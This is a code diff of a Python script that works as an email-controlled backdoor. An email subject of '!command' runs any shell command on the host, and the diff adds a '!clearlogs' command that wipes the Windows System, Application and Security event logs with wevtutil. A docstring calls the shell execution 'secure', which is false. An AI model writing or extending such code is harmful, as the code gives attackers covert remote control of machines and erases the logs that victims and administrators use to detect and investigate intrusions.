@@ -29,15 +29,24 @@ def send_mail(subject, body):
 def execute_command(command):
     """Exécuter une commande shell de manière sécurisée"""
     try:
-        with subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as process:
+        with subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) as process:
             stdout, stderr = process.communicate()
-            output = (stdout + stderr).decode()
             if process.returncode == 0:
-                return "Command executed successfully. Output: " + output
+                return "Command executed successfully. Output:\n" + stdout
             else:
-                return "Error executing command. Output: " + output
+                return "Error executing command. Output:\n" + stderr
     except Exception as e:
-        return f"Error executing command: {e}"
+        return f"Error executing command: {str(e)}"
+
+def clear_logs():
+    """Effacer les logs système"""
+    try:
+        subprocess.call("wevtutil cl System", shell=True)
+        subprocess.call("wevtutil cl Application", shell=True)
+        subprocess.call("wevtutil cl Security", shell=True)
+        return "Logs cleared successfully."
+    except Exception as e:
+        return f"Error clearing logs: {str(e)}"
 
 def process_email_message(email_message):
     """Traitement de l'e-mail"""
@@ -48,7 +57,9 @@ def process_email_message(email_message):
     elif subject == "!status":
         return "System status: OK"
     elif subject == "!help":
-        return "Available commands: \n!command <your command>: Execute a command on the system. \n!status: Get system status. \n!help: Get help message."
+        return "Available commands: \n!command <your command>: Execute a command on the system. \n!status: Get system status. \n!help: Get help message.\n!clearlogs: Clear system logs."
+    elif subject == "!clearlogs":
+        return clear_logs()
     else:
         return "Unknown command"
 
